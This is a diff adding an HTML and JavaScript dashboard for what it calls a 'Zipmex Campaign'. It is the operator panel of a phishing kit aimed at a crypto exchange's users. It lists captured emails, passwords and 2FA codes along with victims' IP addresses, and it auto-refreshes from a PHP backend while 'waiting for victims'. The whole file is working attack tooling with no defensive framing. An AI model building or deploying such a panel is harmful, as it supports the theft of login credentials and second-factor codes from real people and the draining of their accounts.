@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zipmex Campaign Dashboard</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Inter', -apple-system, sans-serif;
+            background: #0d0e1a;
+            color: #e0e0e0;
+            padding: 20px;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 1px solid #2a2b3e;
+        }
+        .header h1 { font-size: 22px; color: #fff; }
+        .header .stats { color: #8888a0; font-size: 14px; }
+        .header .stats span { color: #3944eb; font-weight: 600; }
+        .card {
+            background: #1a1b2e;
+            border: 1px solid #2a2b3e;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+        }
+        .card h3 { font-size: 14px; color: #8888a0; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+        .entry {
+            padding: 12px 0;
+            border-bottom: 1px solid #2a2b3e;
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr auto;
+            gap: 12px;
+            align-items: center;
+            font-size: 13px;
+        }
+        .entry:last-child { border-bottom: none; }
+        .entry .email { color: #fff; font-weight: 500; }
+        .entry .pass { color: #ff6b6b; font-family: monospace; }
+        .entry .totp { color: #ffd93d; font-family: monospace; }
+        .entry .time { color: #8888a0; font-size: 12px; }
+        .entry .ip { color: #555570; font-size: 11px; }
+        .badge { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; }
+        .badge-login { background: rgba(57,68,235,0.2); color: #3944eb; }
+        .badge-2fa { background: rgba(235,57,68,0.2); color: #ff6b6b; }
+        .actions { margin-top: 20px; display: flex; gap: 12px; }
+        .actions button {
+            padding: 8px 16px;
+            background: #3944eb;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        .actions button:hover { background: #2d35c4; }
+        .actions button.danger { background: #eb3939; }
+        .actions button.danger:hover { background: #c42d2d; }
+        .empty { text-align: center; padding: 40px; color: #555570; }
+        .refresh-link {
+            color: #3944eb; cursor: pointer; text-decoration: none; font-size: 13px;
+        }
+        .refresh-link:hover { text-decoration: underline; }
+        #logContent {
+            max-height: 500px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+            line-height: 1.8;
+        }
+        .tab-bar { display: flex; gap: 4px; margin-bottom: 16px; }
+        .tab-bar button {
+            padding: 8px 20px;
+            background: transparent;
+            border: 1px solid #2a2b3e;
+            color: #8888a0;
+            border-radius: 8px 8px 0 0;
+            font-size: 13px;
+            cursor: pointer;
+        }
+        .tab-bar button.active { background: #1a1b2e; border-bottom-color: #1a1b2e; color: #fff; }
+        .tab-content { display: none; }
+        .tab-content.active { display: block; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div>
+            <h1>🎯 Zipmex Campaign Dashboard</h1>
+            <div class="stats" id="stats">Loading stats...</div>
+        </div>
+        <div>
+            <span id="lastRefresh" class="stats">Last refresh: --</span>
+        </div>
+    </div>
+
+    <div class="tab-bar">
+        <button class="active" onclick="switchTab('captures')">📁 Captured Credentials</button>
+        <button onclick="switchTab('iplog')">🌐 IP Log</button>
+        <button onclick="switchTab('master')">📋 Master Log</button>
+    </div>
+
+    <!-- Captures Tab -->
+    <div id="tab-captures" class="tab-content active">
+        <div class="card">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+                <h3>Captured Logins &amp; 2FA Codes</h3>
+                <a class="refresh-link" onclick="loadCaptures()">⟳ Refresh</a>
+            </div>
+            <div id="capturesContainer">
+                <div class="empty">No captures yet. Waiting for victims...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- IP Log Tab -->
+    <div id="tab-iplog" class="tab-content">
+        <div class="card">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+                <h3>IP Access Log</h3>
+                <a class="refresh-link" onclick="loadIpLog()">⟳ Refresh</a>
+            </div>
+            <div id="ipLogContainer">
+                <div class="empty">Loading...</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Master Log Tab -->
+    <div id="tab-master" class="tab-content">
+        <div class="card">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;">
+                <h3>Master Log (All Captures)</h3>
+                <a class="refresh-link" onclick="loadMasterLog()">⟳ Refresh</a>
+            </div>
+            <div id="masterLogContainer">
+                <div class="empty">Loading...</div>
+            </div>
+        </div>
+    </div>
+
+    <div class="actions">
+        <button onclick="loadAll()">⟳ Refresh All</button>
+        <button class="danger" onclick="if(confirm('Clear all captured data?')){fetch('clear.php').then(()=>loadAll())}">🗑 Clear All</button>
+    </div>
+
+    <script>
+        function switchTab(name) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-bar button').forEach(el => el.classList.remove('active'));
+            document.getElementById('tab-' + name).classList.add('active');
+            event.target.classList.add('active');
+        }
+
+        async function loadCaptures() {
+            const container = document.getElementById('capturesContainer');
+            try {
+                const res = await fetch('list_captures.php');
+                const captures = await res.json();
+                
+                if (!captures.length) {
+                    container.innerHTML = '<div class="empty">No captures yet. Waiting for victims...</div>';
+                    return;
+                }
+                
+                let html = '';
+                captures.forEach(c => {
+                    const typeClass = c.type === '2fa' ? 'badge-2fa' : 'badge-login';
+                    html += `
+                        <div class="entry">
+                            <div>
+                                <div class="email">${c.email || 'N/A'}</div>
+                                <div class="ip">${c.ip || ''}</div>
+                            </div>
+                            <div class="pass">${c.password || '-'}</div>
+                            <div class="totp">${c.totp || '-'}</div>
+                            <div>
+                                <span class="badge ${typeClass}">${c.type || 'login'}</span>
+                                <div class="time">${c.timestamp || ''}</div>
+                            </div>
+                        </div>
+                    `;
+                });
+                container.innerHTML = html;
+                
+                document.getElementById('stats').innerHTML = `📧 Total captures: <span>${captures.length}</span> | 2FA codes: <span>${captures.filter(c => c.type === '2fa').length}</span>`;
+            } catch(e) {
+                container.innerHTML = '<div class="empty">Error loading captures. Make sure PHP backend is running.</div>';
+            }
+        }
+
+        async function loadIpLog() {
+            const container = document.getElementById('ipLogContainer');
+            try {
+                const res = await fetch('list_captures.php?type=ip');
+                const data = await res.json();
+                container.innerHTML = '<div id="logContent">' + (data.log || 'No entries') + '</div>';
+            } catch(e) {
+                container.innerHTML = '<div class="empty">Error loading IP log.</div>';
+            }
+        }
+
+        async function loadMasterLog() {
+            const container = document.getElementById('masterLogContainer');
+            try {
+                const res = await fetch('list_captures.php?type=master');
+                const data = await res.json();
+                container.innerHTML = '<div id="logContent">' + (data.log || 'No entries') + '</div>';
+            } catch(e) {
+                container.innerHTML = '<div class="empty">Error loading master log.</div>';
+            }
+        }
+
+        async function loadAll() {
+            document.getElementById('lastRefresh').textContent = 'Last refresh: ' + new Date().toLocaleTimeString();
+            await Promise.all([loadCaptures(), loadIpLog(), loadMasterLog()]);
+        }
+
+        // Auto-refresh every 15 seconds
+        loadAll();
+        setInterval(loadAll, 15000);
+    </script>
+</body>
+</html>
